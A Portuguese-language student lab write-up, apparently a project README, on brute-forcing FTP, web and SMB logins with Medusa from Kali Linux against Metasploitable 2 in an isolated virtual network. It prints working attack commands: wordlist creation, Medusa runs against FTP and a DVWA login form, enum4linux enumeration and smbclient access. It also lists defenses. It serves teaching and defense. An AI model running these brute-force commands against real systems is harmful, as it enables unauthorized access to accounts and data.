# Kali Medusa – Testes de Ataques com Kali Linux e Metasploitable 2

Olá, tudo bem? Meu nome é Vinícius Henrique Nunes, estudante de Sistemas de Informação na UNIFAFIBE. Atualmente estou no terceiro semestre e sou um entusiasta em CyberSec. Por meio deste projeto, apresento habilidades adquiridas durante o curso de Cibersegurança disponibilizado pela DIO.

## Ataques de Força Bruta em Diferentes Serviços

Durante meus estudos, compreendi ataques de força bruta em diferentes serviços:

### FTP

O atacante tenta acessar servidores de transferência de arquivos utilizando listas de usuários e senhas. Caso não exista limite de tentativas ou bloqueio automático, o acesso pode ser comprometido.

### Web

O ataque ocorre em formulários de login, como sites ou painéis administrativos. Bots automatizados testam milhares de combinações rapidamente até encontrar credenciais válidas.

### SMB

O protocolo de compartilhamento de arquivos do Windows também pode ser alvo. O invasor tenta diferentes credenciais para acessar pastas compartilhadas, máquinas ou até a rede inteira.

## Objetivo do Atacante

* Obter acesso não autorizado
* Roubar dados
* Movimentar-se lateralmente dentro da rede

## Principais Defesas

* Senhas fortes e únicas
* Limite de tentativas de login
* Autenticação em dois fatores (2FA)
* Monitoramento e bloqueio de IPs suspeitos

## Ambiente de teste

Utilizei o Kali Linux e o Metasploitable 2 em um ambiente controlado. O Kali Linux foi executado no Hyper-V e o Metasploitable 2 no VirtualBox. Configurei uma rede em ponte entre as duas máquinas virtuais, permitindo comunicação entre elas sem afetar o computador host.

## Utilização da Ferramenta Medusa

Usei a ferramenta Medusa para testar logins em serviços como FTP, SSH, SMB e Web, com o objetivo de verificar se senhas fracas poderiam ser descobertas. Os resultados obtidos permitiram identificar vulnerabilidades de autenticação.

## Exemplos de Scripts

### Criação de Arquivos de Usuários e Senhas Comuns

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

### Ataque de Força Bruta FTP

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 3

### Ataque de Força Bruta Web

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http

-m PAGE:'/dvwa/login.php'

-m FORM:'username=^USER^&password=^PASS^&Login=Login'

-m 'FAIL=Login failed' -t 6

### Enumeração SMB

enum4linux -a 192.168.56.101 | tee enum4_output.txt

less enum4_output.txt

### Acesso utilizando SMBClient

smbclient -L //192.168.56.101 -U UserAdm

## Conclusão

Este teste demonstrou como ataques de força bruta podem comprometer serviços com autenticação fraca. A utilização do Kali Linux e da ferramenta Medusa em conjunto com o Metasploitable 2 permitiu identificar vulnerabilidades reais em um ambiente controlado.

Com base nos resultados, reforça-se a importância do uso de senhas fortes, limitação de tentativas de login e autenticação multifator como principais medidas de mitigação.
